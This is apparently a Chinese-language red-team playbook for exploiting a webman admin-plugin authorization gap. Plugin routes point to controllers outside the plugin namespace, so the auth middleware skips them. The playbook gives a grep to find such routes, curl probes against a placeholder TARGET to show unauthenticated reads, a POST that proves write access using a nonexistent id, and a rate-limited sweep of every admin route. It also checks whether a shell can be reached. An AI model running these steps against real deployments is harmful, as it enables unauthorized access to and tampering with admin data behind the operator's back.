# 目标：webman 应用，插件 `plugin/<name>/config/route.php` 里存在**指向非插件命名空间控制器**的路由
# 症状：同一 URL 前缀下，有的接口 401「请登录」，有的接口直接 200 返回业务数据

## 1. 判定（静态，零流量）
# 插件路由文件里，凡是控制器写在别的命名空间（不是 plugin\<插件名>\app\controller\*）的，几乎必然是鉴权缺口：
grep -nE "\[\\\\?app\\\\|\[\\\\?Webman\\\\|\[['\"][A-Za-z]" plugin/admin/config/route.php
# 典型命中：
#   Route::get('/app/admin/api/game-category/index', [\app\controller\admin\GameCategoryController::class,'index']);
#   控制器在 app\controller\admin\ 下（不带 plugin\ 前缀）→ admin 插件的 middleware.php 里那份
#   AccessControl / EncryptionMiddleware 不会套到它身上；而这些控制器自身又没有 admin()/session 校验。
# 反向再查一遍全局 config/route.php 指向 app\controller\admin\* 的路由（同理会漏鉴权）。

## 2. 确认（在线，带对照）
# 401=路由存在需鉴权 / 404（webman 明文 "xxx not found"）=不存在 / 200+业务 JSON=未授权可达
curl -sS -k -H 'Accept: */*' https://TARGET/app/admin/api/<suspect>/<action>          # 嫌疑点
curl -sS -k -H 'Accept: */*' https://TARGET/app/admin/api/admin/list?page=1&limit=1   # 基线，应 401

## 3. 写能力证明（无副作用）
# 用**不存在的 id** 打 update/set-status/delete 这类接口：返回业务成功即证明写路径可达，且 0 行受影响。
curl -sS -k -H 'Content-Type: application/json' -X POST \
  -d '{"id":999999999,"sort":1}' https://TARGET/app/admin/api/game-category/update-sort
#   → {"code":0,"msg":"操作成功"}

## 4. 批量普查（找全同类）
# 把插件 route.php 与全局 route.php 里的全部 /app/admin/* 路由抽成清单，逐条跑，限速 ≥2s/请求 + 429 退避：
#   python sweep_admin_routes.py          # 见 redteam_attack_files/example.com/sweep_admin_routes.py
# 分类规则：body 含 'top.location.href' 或 '"code":401' → 需鉴权；含 'not found' → 不存在；
#           body 以 { 开头且 code:0 → **未授权成果**；含 '该功能' 且 403 → 运营方开关停用。

## 5. 注意（本目标实测到的反例）
# · 同一个控制器若被两个 route 文件注册，后加载的一方生效 —— 插件 route.php 会覆盖 config/route.php，
#   因此「全局 route 里的 app 命名空间路由」也可能仍是 401（被插件自己的同名路由覆盖）。
# · 部署版会加功能开关：/app/admin/table/*（代码生成器）、/app/admin/plugin/*（插件市场）返回
#   {"code":403,"message":"该功能正在进行中，默认关闭"}。注意 message 而非面板自带的 msg 字段名，
#   这种就是部署方自己加的占位/开关，不是框架行为；不存在的 action 才回 webman 的 "not found"。
# · 拿不到后台 ≠ 能拿 shell：本目标 nginx 无 location ~ \.php$（全站无 PHP-FPM 执行面），
#   后台上传 .phtml/.phar 也只会被当静态文件回显；唯一执行面是 webman Monitor 热重载的
#   config/ 与 plugin/*/{app,config,api}，而这些目录没有可控写入原语。